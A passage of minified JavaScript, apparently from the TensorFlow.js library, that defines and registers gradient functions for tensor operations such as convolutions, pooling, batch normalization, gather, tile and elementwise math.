            } : {
                a: ()=>$t(n, o, !1, !0),
                b: ()=>$t(s, n, !0, !1)
            }
        }
    }
      , jT = {
        kernelName: ka,
        gradFunc: (n,t,e)=>{
            const {blockShape: s, crops: o} = e;
            return {
                x: ()=>Nd(n, s, o)
            }
        }
    }
      , qT = {
        kernelName: "BroadcastTo",
        gradFunc: (n,t,e)=>{
            const s = e
              , o = s.inputShape
              , r = s.shape
              , i = Array.from(r);
            for (let c = o.length - 1; c >= 0; c--)
                if (o[c] === r[c])
                    i[c] = 1;
                else if (1 !== o[c])
                    throw new Error(`broadcastTo(): [${o}] cannot be broadcast to [${r}].`);
            const a = [];
            for (let c = 0; c < i.length; c++)
                i[c] > 1 && a.push(c);
            return {
                x: ()=>ut(n, a, !0)
            }
        }
    }
      , tN = {
        kernelName: Gr,
        gradFunc: n=>({
            x: ()=>n.clone()
        })
    }
      , eN = {
        kernelName: Lr,
        gradFunc: n=>({
            x: ()=>St(n)
        })
    }
      , nN = {
        kernelName: Er,
        inputsToSave: ["x"],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , {clipValueMin: o, clipValueMax: r} = e;
            return {
                x: ()=>Le(rs(oo(s, o), Qo(s, r)), n, St(n))
            }
        }
    }
      , sN = {
        kernelName: Ta,
        inputsToSave: ["x"],
        gradFunc: jg.gradFunc
    }
      , oN = {
        kernelName: Na,
        saveAllInputs: !0,
        gradFunc: (n,t,e)=>{
            const s = t.map((c=>c.shape))
              , {axis: o} = e
              , r = It(o, t[0].shape)[0]
              , i = s.map((c=>c[r]));
            return on(n, i, r).map((c=>()=>c))
        }
    }
      , rN = {
        kernelName: Ra,
        inputsToSave: ["x", "filter"],
        gradFunc: (n,t,e)=>{
            const [s,o] = t
              , {dilations: r, strides: i, pad: a, dataFormat: c} = e;
            return v(eo(r), (()=>`Error in gradient of conv2D: dilation rates greater than 1 are not yet supported in gradients. Got dilations '${r}'`)),
            {
                x: ()=>md(s.shape, n, o, i, a, c),
                filter: ()=>Pd(s, n, o.shape, i, a, c)
            }
        }
    }
      , iN = {
        kernelName: $a,
        inputsToSave: ["dy", "filter"],
        gradFunc: (n,t,e)=>{
            const [s,o] = t
              , {strides: r, pad: i, dataFormat: a, dimRoundingMode: c} = e;
            return {
                dy: ()=>so(n, o, r, i, a, 1, c),
                filter: ()=>Pd(n, s, o.shape, r, i, a, c)
            }
        }
    };
    const cN = D({
        conv3DBackpropFilter_: function aN(n, t, e, s, o) {
            let r = n;
            4 === n.rank && (r = W(n, [1, n.shape[0], n.shape[1], n.shape[2], n.shape[3]]));
            let i = t;
            4 === i.rank && (i = W(t, [1, t.shape[0], t.shape[1], t.shape[2], t.shape[3]])),
            v(5 === r.rank, (()=>`Error in conv3dDerFilter: input must be rank 5, but got shape ${r.shape}.`)),
            v(5 === i.rank, (()=>`Error in conv3dDerFilter: dy must be rank 5, but got shape ${i.shape}.`)),
            v(5 === e.length, (()=>`Error in conv3dDerFilter: filterShape must be length 5, but got ${e}.`)),
            v(r.shape[4] === e[3], (()=>`Error in conv3dDerFilter: depth of input ${r.shape[4]}) must match input depth in filter (${e[3]}.`)),
            v(i.shape[4] === e[4], (()=>`Error in conv3dDerFilter: depth of dy (${i.shape[4]}) must match output depth for filter (${e[4]}).`));
            const a = {
                x: r,
                dy: i
            }
              , c = {
                strides: s,
                pad: o,
                filterShape: e
            };
            return G.runKernel(du, a, c)
        }
    })
      , lN = {
        kernelName: Ga,
        inputsToSave: ["x", "filter"],
        gradFunc: (n,t,e)=>{
            const {dilations: s, strides: o, pad: r} = e;
            v(eo(s), (()=>`Error in gradient of conv3D: dilation rates greater than 1 are not yet supported in gradients. Got dilations '${s}'`));
            const [i,a] = t;
            return {
                x: ()=>Dm(i.shape, n, a, o, r),
                filter: ()=>cN(i, n, a.shape, o, r)
            }
        }
    }
      , uN = {
        kernelName: Dr,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>E(ne(jm(st(e, "float32"))), n)
            }
        }
    }
      , dN = {
        kernelName: Wr,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>E(qm(st(e, "float32")), n)
            }
        }
    }
      , hN = {
        kernelName: La,
        inputsToSave: ["x"],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , {axis: o, exclusive: r, reverse: i} = e;
            return {
                x: ()=>{
                    const a = Yt([o], s.rank);
                    let c = Mm(n, o, r, !i);
                    return null != a && (c = kt(c, a)),
                    c
                }
            }
        }
    }
      , pN = {
        kernelName: Ea,
        inputsToSave: ["x", "filter"],
        gradFunc: (n,t,e)=>{
            const {dilations: s, strides: o, pad: r, dimRoundingMode: i} = e
              , a = s ?? [1, 1];
            v(eo(a), (()=>`Error in gradient of depthwiseConv2dNative: dilation rates greater than 1 are not yet supported. Got dilations '${a}'`));
            const [c,l] = t;
            return v(4 === c.rank, (()=>`Error in gradient of depthwiseConv2dNative: input must be rank 4, but got rank ${c.rank}.`)),
            v(4 === l.rank, (()=>`Error in gradient of depthwiseConv2dNative: filter must be rank 4, but got rank ${l.rank}.`)),
            v(c.shape[3] === l.shape[2], (()=>`Error in gradient of depthwiseConv2d: number of input channels (${c.shape[3]}) must match the inChannels dimension in filter ${l.shape[2]}.`)),
            v(Te(o, a), (()=>`Error in gradient of depthwiseConv2d: Either strides or dilations must be  1. Got strides ${o} and dilations '${a}'.`)),
            ze("depthwiseConv2d", r, i),
            {
                x: ()=>Nk(c.shape, n, l, o, r, a, i),
                filter: ()=>kk(c, n, l.shape, o, r, a, i)
            }
        }
    }
      , fN = {
        kernelName: Da,
        inputsToSave: ["x", "filter"],
        gradFunc: (n,t,e)=>{
            const [s,o] = t
              , r = {
                x: s,
                filter: o,
                dy: n
            }
              , i = {
                x: s,
                filter: o,
                dy: n
            };
            return {
                x: ()=>G.runKernel(yu, r, e),
                filter: ()=>G.runKernel(Iu, i, e)
            }
        }
    }
      , mN = {
        kernelName: Vr,
        outputsToSave: [!0],
        gradFunc: (n,t)=>{
            const [e] = t
              , s = {
                dy: n,
                y: e
            };
            return {
                x: ()=>G.runKernel(Cu, s)
            }
        }
    }
      , gN = {
        kernelName: Fr,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t
              , s = E(An(ne(Bt(e))), 2 / Math.sqrt(Math.PI));
            return {
                x: ()=>E(n, s)
            }
        }
    }
      , bN = {
        kernelName: zr,
        outputsToSave: [!0],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>E(n, e)
            }
        }
    }
      , xN = {
        kernelName: Ma,
        inputsToSave: ["input"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                input: ()=>W(n, e.shape)
            }
        }
    }
      , yN = {
        kernelName: Xr,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>E(n, An(e))
            }
        }
    }
      , IN = {
        kernelName: Ar,
        gradFunc: n=>({
            x: ()=>St(n)
        })
    }
      , wN = {
        kernelName: Pr,
        inputsToSave: ["a", "b"],
        gradFunc: (n,t)=>{
            const [e,s] = t
              , o = gt(e.shape, s.shape);
            return {
                a: ()=>{
                    const a = dt(n, st(s, "float32"))
                      , c = ce(e.shape, o);
                    return c.length > 0 ? W(ut(a, c), e.shape) : a
                }
                ,
                b: ()=>{
                    let a = E(n, st(e, "float32"));
                    const c = ce(s.shape, o);
                    c.length > 0 && (a = W(ut(a, c), s.shape));
                    const l = Bt(s);
                    return ne(dt(a, st(l, "float32")))
                }
            }
        }
    }
      , CN = {
        kernelName: Va,
        inputsToSave: ["x", "mean", "variance", "scale"],
        gradFunc: (n,t,e)=>{
            const {varianceEpsilon: s} = e
              , [o,r,i,a] = t
              , c = a ?? Gt(1)
              , l = ce(r.shape, o.shape)
              , u = [];
            if (1 === r.rank) {
                for (let y = 0; y < o.shape.length - 1; ++y)
                    u.push(o.shape[y]);
                u.push(1)
            }
            const d = pt(o, r)
              , h = E(n, c)
              , p = Ym(Q(i, Gt(s)))
              , f = E(E(E(p, p), p), Gt(-.5));
            return {
                x: ()=>1 === r.rank ? W(E(E(n, Nn(W(p, [1, 1, 1, r.shape[0]]), u)), c), o.shape) : W(E(E(n, p), c), o.shape),
                mean: ()=>{
                    let y = E(E(p, Gt(-1)), h);
                    return 1 === r.rank && (y = ut(y, l)),
                    W(y, r.shape)
                }
                ,
                variance: ()=>{
                    let y = E(E(f, d), h);
                    return 1 === r.rank && (y = ut(y, l)),
                    W(y, r.shape)
                }
                ,
                scale: ()=>{
                    const y = E(d, p);
                    let w = E(n, y);
                    return 1 === r.rank && (w = ut(w, l)),
                    W(w, r.shape)
                }
                ,
                offset: ()=>{
                    let y = n;
                    return 1 === r.rank && (y = ut(y, l)),
                    W(y, r.shape)
                }
            }
        }
    }
      , vN = {
        kernelName: Fa,
        inputsToSave: ["x", "indices"],
        gradFunc: (n,t,e)=>{
            const [s,o] = t
              , {axis: r, batchDims: i} = e
              , a = It(r, s.shape)[0]
              , c = (l,u,d)=>()=>{
                const h = l.shape
                  , p = u.size
                  , f = h.slice(0, a)
                  , m = f.length
                  , g = h.slice(r, h.length).slice(1)
                  , b = g.length
                  , x = qg(0, m)
                  , I = qg(m + 1, m + 1 + b)
                  , y = t0([f, [p], g])
                  , w = W(d, y)
                  , C = W(u, [p])
                  , k = t0([[m], x, I])
                  , S = kt(w, k);
                let T = og(S, C, l.shape[a]);
                const R = Cs(k);
                return T = kt(T, R),
                T
            }
            ;
            if (1 === i) {
                const l = s.shape[0]
                  , u = s.split(l, 0);
                return {
                    x: ()=>On(u.map(((p,f)=>c(p, o.slice(f, 1), n.slice(f, 1))()))).reshape(s.shape),
                    indices: ()=>o
                }
            }
            return {
                x: c(s, o, n),
                indices: ()=>o
            }
        }
    };
    function qg(n, t) {
        const e = [];
        for (let s = n; s < t; ++s)
            e.push(s);
        return e
    }
    function t0(n) {
        const t = [];
        for (let e = 0; e < n.length; ++e)
            for (let s = 0; s < n[e].length; ++s)
                t.push(n[e][s]);
        return t
    }
    const SN = {
        kernelName: Or,
        inputsToSave: ["a", "b"],
        gradFunc: (n,t)=>{
            const [e,s] = t;
            return {
                a: ()=>St(e),
                b: ()=>St(s)
            }
        }
    }
      , kN = {
        kernelName: Kr,
        gradFunc: n=>({
            x: ()=>st(n, "float32")
        })
    }
      , TN = {
        kernelName: Zr,
        gradFunc: n=>({
            x: ()=>St(n)
        })
    }
      , NN = {
        kernelName: Br,
        gradFunc: n=>({
            x: ()=>St(n)
        })
    }
      , RN = {
        kernelName: Hr,
        gradFunc: n=>({
            x: ()=>St(n)
        })
    }
      , $N = {
        kernelName: Xa,
        inputsToSave: ["x"],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , {alpha: o} = e
              , r = sn(s, 0);
            return {
                x: ()=>Le(r, n, E(n, o))
            }
        }
    }
      , GN = {
        kernelName: Ur,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>dt(n, Q(e, 1))
            }
        }
    }
      , LN = {
        kernelName: _r,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>dt(n, st(e, "float32"))
            }
        }
    }
      , EN = {
        kernelName: "LogSoftmax",
        inputsToSave: [],
        outputsToSave: [!0],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , {axis: o} = e;
            return {
                logits: ()=>{
                    const i = An(s);
                    return pt(n, E(ut(n, o, !0), i))
                }
            }
        }
    };
    const WN = D({
        localResponseNormalizationBackprop_: function DN(n, t, e, s=5, o=1, r=1, i=.5) {
            const a = {
                x: n,
                y: t,
                dy: e
            }
              , c = {
                depthRadius: s,
                bias: o,
                alpha: r,
                beta: i
            };
            return G.runKernel(Ru, a, c)
        }
    })
      , MN = {
        kernelName: Ba,
        inputsToSave: ["x"],
        outputsToSave: [!0],
        gradFunc: (n,t,e)=>{
            const [s,o] = t
              , {depthRadius: r, bias: i, alpha: a, beta: c} = e;
            return {
                x: ()=>WN(s, o, n, r, i, a, c)
            }
        }
    };
    function e0(n, t, e, s) {
        return t.rank < e.rank && (t = W(t, re(t.shape, s))),
        n.rank < e.rank && (n = W(n, re(n.shape, s))),
        {
            x: ()=>E(n, st(Xn(e, t), n.dtype))
        }
    }
    const n0 = {
        kernelName: Ha,
        inputsToSave: ["x"],
        outputsToSave: [!0],
        gradFunc: (n,t,e)=>{
            const s = e
              , {reductionIndices: o} = s
              , r = t[0]
              , c = e0(n, t[1], r, It(o, r.shape));
            return {
                x: ()=>c.x()
            }
        }
    }
      , VN = {
        kernelName: Yr,
        inputsToSave: ["a", "b"],
        gradFunc: (n,t)=>{
            const [e,s] = t;
            return {
                a: ()=>E(n, st(oo(e, s), "float32")),
                b: ()=>E(n, st(Wc(e, s), "float32"))
            }
        }
    };
    const zN = D({
        maxPool3dGrad_: function FN(n, t, e, s, o, r, i) {
            const a = N(n, "dy", "maxPool3dGrad")
              , c = N(t, "input", "maxPool3dGrad")
              , l = N(e, "output", "maxPool3dGrad");
            let u = a
              , d = c
              , h = l
              , p = !1;
            4 === c.rank && (p = !0,
            u = W(a, [1, a.shape[0], a.shape[1], a.shape[2], a.shape[3]]),
            d = W(c, [1, c.shape[0], c.shape[1], c.shape[2], c.shape[3]]),
            h = W(l, [1, l.shape[0], l.shape[1], l.shape[2], l.shape[3]])),
            v(5 === u.rank, (()=>`Error in maxPool3dGrad: dy must be rank 5 but got rank ${u.rank}.`)),
            v(5 === d.rank, (()=>`Error in maxPool3dGrad: input must be rank 5 but got rank ${d.rank}.`)),
            v(5 === h.rank, (()=>`Error in maxPool3dGrad: output must be rank 5 but got rank ${h.rank}.`)),
            ze("maxPool3dGrad", r, i);
            const f = {
                dy: u,
                input: d,
                output: h
            }
              , m = {
                filterSize: s,
                strides: o,
                pad: r,
                dimRoundingMode: i
            }
              , g = G.runKernel(Gu, f, m);
            return p ? W(g, [g.shape[1], g.shape[2], g.shape[3], g.shape[4]]) : g
        }
    })
      , XN = {
        kernelName: Ua,
        inputsToSave: ["x"],
        outputsToSave: [!0],
        gradFunc: (n,t,e)=>{
            const [s,o] = t
              , {filterSize: r, strides: i, pad: a, dimRoundingMode: c} = e;
            return {
                x: ()=>zN(n, s, o, r, i, a, c)
            }
        }
    };
    const PN = D({
        maxPoolGrad_: function AN(n, t, e, s, o, r, i) {
            const a = N(n, "dy", "maxPoolGrad")
              , c = N(t, "input", "maxPoolGrad")
              , l = N(e, "output", "maxPoolGrad");
            v(c.rank === a.rank, (()=>`Rank of input (${c.rank}) does not match rank of dy (${a.rank})`)),
            v(4 === a.rank, (()=>`Error in maxPoolGrad: dy must be rank 4 but got rank ${a.rank}.`)),
            v(4 === c.rank, (()=>`Error in maxPoolGrad: input must be rank 4 but got rank ${c.rank}.`)),
            ze("maxPoolGrad", r, i);
            const u = {
                dy: a,
                input: c,
                output: l
            }
              , d = {
                filterSize: s,
                strides: o,
                pad: r,
                dimRoundingMode: i
            };
            return G.runKernel($u, u, d)
        }
    })
      , ON = {
        kernelName: _a,
        inputsToSave: ["x"],
        outputsToSave: [!0],
        gradFunc: (n,t,e)=>{
            const [s,o] = t
              , {filterSize: r, strides: i, pad: a} = e;
            return {
                x: ()=>PN(n, s, o, r, i, a)
            }
        }
    }
      , KN = {
        kernelName: Ya,
        inputsToSave: ["x"],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , {axis: o} = e
              , r = It(o, s.shape)
              , c = Z(me(s.shape, r)[1]);
            return {
                x: ()=>{
                    const u = s.shape.slice();
                    r.forEach((p=>{
                        u[p] = 1
                    }
                    ));
                    const d = W(n, u);
                    return dt(E(d, Ss(s.shape, "float32")), c)
                }
            }
        }
    }
      , ZN = {
        kernelName: Qa,
        inputsToSave: ["x"],
        outputsToSave: [!0],
        gradFunc: (n,t,e)=>{
            const s = e
              , {axis: o} = s
              , [r,i] = t
              , c = e0(n, i, r, It(o, r.shape));
            return {
                x: ()=>c.x()
            }
        }
    }
      , BN = {
        kernelName: Qr,
        inputsToSave: ["a", "b"],
        gradFunc: (n,t)=>{
            const [e,s] = t;
            return {
                a: ()=>E(n, st(Qo(e, s), "float32")),
                b: ()=>E(n, st(sn(e, s), "float32"))
            }
        }
    }
      , HN = {
        kernelName: Ja,
        inputsToSave: ["x"],
        gradFunc: (n,t,e)=>{
            const s = t[0]
              , {paddings: o} = e
              , r = o.map((i=>i[0]));
            return {
                x: ()=>Xt(n, r, s.shape)
            }
        }
    }
      , _N = {
        kernelName: Jr,
        inputsToSave: ["a", "b"],
        gradFunc: (n,t)=>{
            const [e,s] = t
              , o = gt(e.shape, s.shape);
            return {
                a: ()=>{
                    const a = ce(e.shape, o);
                    return a.length > 0 ? W(ut(n, a), e.shape) : n
                }
                ,
                b: ()=>{
                    const a = E(n, ne(Dc(dt(e, s))))
                      , c = ce(s.shape, o);
                    return c.length > 0 ? W(ut(a, c), s.shape) : a
                }
            }
        }
    }
      , UN = {
        kernelName: jr,
        inputsToSave: ["a", "b"],
        gradFunc: (n,t)=>{
            const [e,s] = t
              , o = gt(e.shape, s.shape);
            return {
                a: ()=>{
                    const a = E(n, st(s, "float32"))
                      , c = ce(e.shape, o);
                    return c.length > 0 ? W(ut(a, c), e.shape) : a
                }
                ,
                b: ()=>{
                    const a = E(n, st(e, "float32"))
                      , c = ce(s.shape, o);
                    return c.length > 0 ? W(ut(a, c), s.shape) : a
                }
            }
        }
    }
      , YN = {
        kernelName: ja,
        gradFunc: n=>({
            x: ()=>ne(n)
        })
    }
      , JN = {
        kernelName: tc,
        gradFunc: n=>({
            x: ()=>St(n)
        })
    }
      , jN = {
        kernelName: nc,
        saveAllInputs: !0,
        gradFunc: (n,t,e)=>{
            const {axis: s} = e;
            return lo(n, s).map((r=>()=>r))
        }
    }
      , s0 = {
        kernelName: sc,
        inputsToSave: ["x"],
        gradFunc: (n,t,e)=>{
            const s = t[0]
              , {paddings: o} = e
              , r = o.map((i=>i[0]));
            return {
                x: ()=>Xt(n, r, s.shape)
            }
        }
    }
      , qN = {
        kernelName: qr,
        inputsToSave: ["a", "b"],
        outputsToSave: [!0],
        gradFunc: (n,t)=>{
            const [e,s,o] = t
              , r = e
              , i = s
              , a = gt(r.shape, i.shape);
            return {
                a: ()=>{
                    const u = st(i, "float32");
                    let d = E(n, E(u, Yo(r, pt(u, Gt(1)))));
                    const h = ce(r.shape, a);
                    return h.length > 0 && (d = ut(d, h)),
                    W(d, r.shape)
                }
                ,
                b: ()=>{
                    const u = sn(r, 0)
                      , d = Le(u, Pn(r), St(r));
                    let h = E(n, E(o, d));
                    const p = ce(i.shape, a);
                    return p.length > 0 && (h = ut(h, p)),
                    W(h, i.shape)
                }
            }
        }
    }
      , tR = {
        kernelName: oc,
        inputsToSave: ["x", "alpha"],
        gradFunc: (n,t)=>{
            const [e,s] = t
              , o = sn(e, 0);
            return {
                x: ()=>Le(o, n, E(n, s)),
                alpha: ()=>{
                    let r = Le(o, St(n), E(n, e));
                    const i = ce(s.shape, n.shape);
                    return i.length > 0 && (r = ut(r, i)),
                    W(r, s.shape)
                }
            }
        }
    };
    function nR(n, t, e) {
        const s = n.shape.length
          , o = s - e.length
          , r = Yt(e, s);
        let i = n;
        null != r && (i = kt(n, r));
        const a = i.shape.slice()
          , l = a.splice(s - e.length, e.length).reduce(((h,p)=>h * p), 1);
        a.push(l);
        let d = function eR(n, t, e) {
            const s = n.shape.slice();
            s[e] = 1;
            const o = W(t, s)
              , r = bd(n, e, !0, !1)
              , i = bd(n, e, !0, !0)
              , a = E(r, i);
            return E(o, a)
        }(i.reshape(a), t, o);
        if (d = d.reshape(i.shape),
        null != r) {
            const h = Cs(r);
            d = kt(d, h)
        }
        return d
    }
    const sR = {
        kernelName: rc,
        inputsToSave: ["x"],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , {axis: o} = e;
            let r = [];
            return r = null == o ? s.shape.map(((i,a)=>a)) : "number" == typeof o ? [o] : o,
            {
                x: ()=>nR(s, n, r)
            }
        }
    }
      , oR = {
        kernelName: Mr,
        inputsToSave: ["a", "b"],
        gradFunc: (n,t)=>{
            const [e,s] = t
              , o = gt(e.shape, s.shape);
            return {
                a: ()=>{
                    const a = dt(n, st(s, "float32"))
                      , c = ce(e.shape, o);
                    return c.length > 0 ? W(ut(a, c), e.shape) : a
                }
                ,
                b: ()=>{
                    let a = E(n, st(e, "float32"));
                    const c = ce(s.shape, o);
                    c.length > 0 && (a = W(ut(a, c), s.shape));
                    const l = Bt(s);
                    return ne(dt(a, st(l, "float32")))
                }
            }
        }
    }
      , rR = {
        kernelName: ti,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>dt(n, ne(Bt(e)))
            }
        }
    }
      , iR = {
        kernelName: ni,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t
              , s = E(Qo(e, 6), Wi(e));
            return {
                x: ()=>E(n, st(s, "float32"))
            }
        }
    }
      , aR = {
        kernelName: ei,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>E(n, st(Wi(e), "float32"))
            }
        }
    }
      , cR = {
        kernelName: ic,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>W(n, e.shape)
            }
        }
    }
      , lR = {
        kernelName: cc,
        inputsToSave: ["images"],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , o = {
                dy: n,
                images: s
            };
            return {
                images: ()=>G.runKernel(Fu, o, e)
            }
        }
    }
      , uR = {
        kernelName: ac,
        inputsToSave: ["images"],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , o = {
                dy: n,
                images: s
            };
            return {
                images: ()=>G.runKernel(Vu, o, e)
            }
        }
    }
      , dR = {
        kernelName: lc,
        gradFunc: (n,t,e)=>{
            const {dims: s} = e
              , o = It(s, n.shape);
            return {
                x: ()=>ao(n, o)
            }
        }
    }
      , hR = {
        kernelName: si,
        gradFunc: n=>({
            x: ()=>St(n)
        })
    }
      , pR = {
        kernelName: oi,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>ne(dt(n, E(Yo(e, 1.5), 2)))
            }
        }
    }
      , fR = {
        kernelName: uc,
        inputsToSave: ["condition"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                condition: ()=>st(St(e), "float32"),
                t: ()=>E(n, st(e, n.dtype)),
                e: ()=>E(n, st(vd(e), n.dtype))
            }
        }
    }
      , mR = {
        kernelName: ri,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>{
                    const s = sn(e, Gt(0))
                      , o = Gt(Pc)
                      , r = Gt(Oc)
                      , i = E(n, r)
                      , a = E(E(n, o), An(st(e, "float32")));
                    return Le(s, i, a)
                }
            }
        }
    }
      , gR = {
        kernelName: li,
        outputsToSave: [!0],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>E(n, E(e, pt(Gt(1), e)))
            }
        }
    }
      , bR = {
        kernelName: ci,
        gradFunc: n=>({
            x: ()=>St(n)
        })
    }
      , xR = {
        kernelName: ii,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>E(gd(st(e, "float32")), n)
            }
        }
    }
      , yR = {
        kernelName: ai,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>E(Wm(st(e, "float32")), n)
            }
        }
    }
      , IR = {
        kernelName: dc,
        inputsToSave: ["x"],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , {begin: o, size: r} = e
              , i = s.shape
              , [a,c] = zc(s, o, r)
              , l = [];
            for (let u = 0; u < n.rank; u++)
                l.push([a[u], i[u] - a[u] - c[u]]);
            return {
                x: ()=>Td(n, l)
            }
        }
    }
      , wR = {
        kernelName: mc,
        outputsToSave: [!0],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , {dim: o} = e
              , i = E(n, s);
            return {
                logits: ()=>pt(i, E(ut(i, [o], true), s))
            }
        }
    }
      , CR = {
        kernelName: ui,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>E(n, _o(e))
            }
        }
    }
      , o0 = {
        kernelName: pc,
        gradFunc: (n,t,e)=>{
            const {blockShape: s, paddings: o} = e;
            return {
                x: ()=>fd(n, s, o)
            }
        }
    }
      , r0 = {
        kernelName: fc,
        gradFunc: (n,t,e)=>{
            const {axis: s} = e;
            return {
                x: ()=>Xe(n, s)
            }
        }
    }
      , vR = {
        kernelName: di,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>dt(n, E(Ee(st(e, "float32")), 2))
            }
        }
    }
      , SR = {
        kernelName: zu,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>E(n, E(st(e, "float32"), 2))
            }
        }
    }
      , kR = {
        kernelName: hi,
        inputsToSave: ["a", "b"],
        gradFunc: (n,t)=>{
            const [e,s] = t
              , o = Gt(2);
            return {
                a: ()=>E(n, E(o, pt(e, s))),
                b: ()=>E(n, E(o, pt(s, e)))
            }
        }
    }
      , TR = {
        kernelName: bi,
        gradFunc: n=>({
            x: ()=>St(n)
        })
    }
      , NR = {
        kernelName: pi,
        inputsToSave: ["a", "b"],
        gradFunc: (n,t)=>{
            const [e,s] = t
              , o = gt(e.shape, s.shape);
            return {
                a: ()=>{
                    let a = n;
                    const c = ce(e.shape, o);
                    return c.length > 0 && (a = ut(a, c)),
                    W(a, e.shape)
                }
                ,
                b: ()=>{
                    let a = n;
                    const c = ce(s.shape, o);
                    return c.length > 0 && (a = ut(a, c)),
                    W(ne(a), s.shape)
                }
            }
        }
    }
      , RR = {
        kernelName: hc,
        inputsToSave: ["x"],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , o = s.shape.slice()
              , {axis: r} = e;
            It(r, s.shape).forEach((l=>{
                o[l] = 1
            }
            ));
            const a = W(n, o)
              , c = E(a, Ss(s.shape, "float32"));
            return {
                x: ()=>c
            }
        }
    }
      , $R = {
        kernelName: fi,
        inputsToSave: ["x"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>dt(n, Bt(gd(e)))
            }
        }
    }
      , GR = {
        kernelName: mi,
        outputsToSave: [!0],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>E(pt(Gt(1), Bt(e)), n)
            }
        }
    }
      , LR = {
        kernelName: gi,
        inputsToSave: ["x"],
        gradFunc: (n,t,e)=>{
            const [s] = t
              , {reps: o} = e;
            return {
                x: ()=>{
                    let i = St(s);
                    if (1 === s.rank)
                        for (let a = 0; a < o[0]; ++a)
                            i = Q(i, Xt(n, [a * s.shape[0]], [s.shape[0]]));
                    else if (2 === s.rank)
                        for (let a = 0; a < o[0]; ++a)
                            for (let c = 0; c < o[1]; ++c)
                                i = Q(i, Xt(n, [a * s.shape[0], c * s.shape[1]], [s.shape[0], s.shape[1]]));
                    else if (3 === s.rank)
                        for (let a = 0; a < o[0]; ++a)
                            for (let c = 0; c < o[1]; ++c)
                                for (let l = 0; l < o[2]; ++l)
                                    i = Q(i, Xt(n, [a * s.shape[0], c * s.shape[1], l * s.shape[2]], [s.shape[0], s.shape[1], s.shape[2]]));
                    else {
                        if (4 !== s.rank)
                            throw new Error(`Gradient for tile operation is not implemented for rank-${s.rank} tensors yet.`);
                        for (let a = 0; a < o[0]; ++a)
                            for (let c = 0; c < o[1]; ++c)
                                for (let l = 0; l < o[2]; ++l)
                                    for (let u = 0; u < o[3]; ++u)
                                        i = Q(i, Xt(n, [a * s.shape[0], c * s.shape[1], l * s.shape[2], u * s.shape[3]], [s.shape[0], s.shape[1], s.shape[2], s.shape[3]]))
                    }
                    return i
                }
            }
        }
    }
      , ER = {
        kernelName: zo,
        gradFunc: (n,t,e)=>{
            const s = e
              , {perm: o} = s
              , r = Cs(o);
            return {
                x: ()=>kt(n, r)
            }
        }
    }
      , DR = {
        kernelName: gc,
        gradFunc: (n,t,e)=>{
            const s = e
              , {axis: o} = s;
            return {
                value: ()=>On(n, o)
            }
        }
    }
      , WR = {
        kernelName: bc,
        inputsToSave: ["segmentIds"],
        gradFunc: (n,t)=>{
            const [e] = t;
            return {
                x: ()=>function MR(n, t) {
                    const e = vs(t, St(t))
                      , s = Id(n, e);
                    let o = oo(t, Gt(0, "int32"));
                    const r = s.rank - o.rank;
                    for (let a = 0; a < r; ++a)
                        o = Ae(o, a + 1);
                    o = rs(o, Ss(s.shape, "bool"));
                    const i = St(s);
                    return Le(o, s, i)
                }(n, e)
            }
        }
    };
    const VR = {
        kernelName: xc,
        gradFunc: n=>({
            x: ()=>St(n)
        })
    }
      , FR = [jg, WT, MT, VT, FT, zT, XT, AT, PT, OT, KT, ZT, _T, QT, JT, jT, qT, tN, eN, nN, sN, oN, iN, rN, lN, uN, dN, hN, pN, fN, oR, mN, gN, bN, xN, yN, wN, IN, CN, vN, SN, kN, TN, NN, RN, $N, GN, LN, EN, MN, n0, n0, VN, XN, ON, KN, ZN, BN, HN, _N, UN, YN, {
        kernelName: ec,
        inputsToSave: ["indices"],
        gradFunc: (n,t)=>{
            const e = t[0];
            return {
                indices: ()=>ge(e.shape, "float32")
            }
        }
    }, JN, jN, s0, s0, qN, tR, sR, rR, iR, aR, cR, lR, uR, dR, hR, pR, fR, mR, gR, bR, xR, yR, IR, wR, CR, o0, o0, r0, r0, vR, kR, SR, TR, NR, RR, $R, GR, LR, ER, DR, WR, VR];
    for (const n of FR)
        mw(n);
    O().prototype.abs = function() {
